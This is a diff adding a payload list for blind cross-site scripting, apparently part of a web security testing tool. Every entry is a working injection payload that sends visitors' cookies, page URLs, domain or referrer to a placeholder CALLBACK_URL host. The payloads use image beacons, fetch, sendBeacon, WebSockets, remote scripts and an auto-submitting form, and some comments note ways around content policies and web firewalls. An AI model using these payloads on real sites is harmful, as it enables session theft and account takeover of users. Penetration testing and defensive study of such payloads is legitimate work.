@@ -1,0 +1,26 @@
+# Blind XSS — Out-of-band payloads (replace CALLBACK_URL with your server)
+# Use --blind-host flag to auto-inject your callback URL
+# Image beacon (bypasses most CSP)
+<script>new Image().src='CALLBACK_URL/xss?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)</script>
+# Fetch POST
+<script>fetch('CALLBACK_URL/xss',{method:'POST',mode:'no-cors',body:JSON.stringify({c:document.cookie,u:location.href,d:document.domain,l:localStorage.length})})</script>
+# Navigator sendBeacon
+<script>navigator.sendBeacon('CALLBACK_URL/xss',JSON.stringify({c:document.cookie,u:location.href}))</script>
+# XSS Hunter style
+<script src="CALLBACK_URL/xss.js"></script>
+# Script tag OOB
+<script>document.write('<img src="CALLBACK_URL/xss?c='+document.cookie+'">')</script>
+# setTimeout delayed exfil (WAF evasion)
+<script>setTimeout(function(){new Image().src='CALLBACK_URL/xss?c='+btoa(document.cookie)},2000)</script>
+# iframe + postMessage exfil
+<iframe src="javascript:parent.postMessage(document.cookie,'*')"></iframe>
+# WebSocket exfil
+<script>var ws=new WebSocket('wss://CALLBACK_URL');ws.onopen=function(){ws.send(document.cookie)}</script>
+# DNS exfil via img (works through restrictive CSP)
+<img src="//CALLBACK_URL/?c=COOKIE_PLACEHOLDER">
+# SVG blind XSS
+<svg onload="new Image().src='CALLBACK_URL/xss?d='+document.domain">
+# Form-based exfil (no JS needed if HTML injection)
+<form action="CALLBACK_URL/xss" method="POST"><input name="c" value="INJECT"><input type="submit" id="s"><script>document.getElementById('s').click()</script></form>
+# Header-based blind XSS (inject in User-Agent, Referer, X-Forwarded-For)
+<script>new Image().src='CALLBACK_URL/xss?h='+encodeURIComponent(document.referrer)</script>
